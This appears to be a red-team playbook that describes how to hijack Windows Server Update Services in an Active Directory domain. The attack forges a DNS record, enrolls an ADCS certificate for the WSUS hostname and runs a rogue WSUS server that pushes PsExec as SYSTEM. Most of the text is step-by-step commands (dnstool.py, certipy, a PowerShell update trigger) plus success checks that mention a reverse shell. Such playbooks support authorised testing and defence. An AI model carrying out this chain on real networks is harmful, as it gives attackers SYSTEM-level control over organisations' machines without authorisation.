# WSUS MITM via DNS Injection + ADCS Certificate Forgery

## When this applies

- WSUS clients point to an HTTPS upstream (e.g., `https://wsus.domain:8531`).
- You can:
  - (a) Inject DNS records (CREATE_CHILD ACL on zone, or any authenticated user for new records)
  - (b) Enroll certs from a template with `EnrolleeSuppliesSubject=True` + Server Auth EKU

- Goal: redirect WSUS clients to an attacker-controlled rogue WSUS server, deliver a malicious update, gain SYSTEM on the targets.

## Technique

Inject a DNS record pointing the WSUS hostname to your IP. Enroll a TLS cert valid for that hostname via ADCS. Run a rogue WSUS server with the forged cert. Trigger Windows Update on the target — the update handler downloads and executes attacker payload as `NT AUTHORITY\SYSTEM`.

## Steps

```bash
# 1. Enumerate WSUS policy on target (from any shell or registry read):
#    HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate → WUServer, UseWUServer=1

# 2. Inject DNS A record pointing WSUS hostname to attacker IP
python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a add -r 'wsus.domain' -d <attacker_IP> DC_IP
# NOTE: If record exists but doesn't resolve, delete first then re-add (tombstone cycle):
python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a remove -r 'wsus.domain' -d <old_IP> DC_IP
# Then re-add. Verify with: nslookup wsus.domain DC_IP

# 3. Enroll TLS certificate for WSUS hostname via ADCS (trusted by DC's CA)
certipy req -u user@domain -p pass -ca 'domain-DC-CA' -template 'TemplateName' -upn '' -dns 'wsus.domain' -dc-ip DC_IP
# Or via certreq.exe from a shell in the enrollment group

# 4. Run rogue WSUS server with TLS on the WSUS port (typically 8531 for HTTPS)
# pywsus_tls.py or SharpWSUS — serves a Microsoft-signed executable (e.g. PsExec64.exe)
# with attacker-controlled command arguments

# 5. Trigger Windows Update from a context that can reach the WSUS server:
#    PowerShell: (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0")
#    Then Install() — the install handler downloads and executes the payload as NT AUTHORITY\SYSTEM
# Chain: DNS injection → cert enrollment → rogue WSUS TLS → PsExec as SYSTEM
```

## Verifying success

- `nslookup wsus.domain DC_IP` resolves to your attacker IP.
- The rogue WSUS server logs the target's request for an update.
- The target executes the delivered payload (reverse shell connects, file appears, etc.).

## Common pitfalls

- DNS tombstone bug — a stale record may persist after a delete. Always do `remove` then `add`.
- If the WSUS upstream is HTTP (not HTTPS), skip step 3 entirely — no cert needed.
- Microsoft has hardened WSUS update signing in newer Windows builds — verify the target's update handler accepts your signed PsExec64.exe before chaining.

## Tools

- dnstool.py (krbrelayx)
- bloodyAD (alternative DNS injection)
- certipy
- pywsus_tls.py
- SharpWSUS
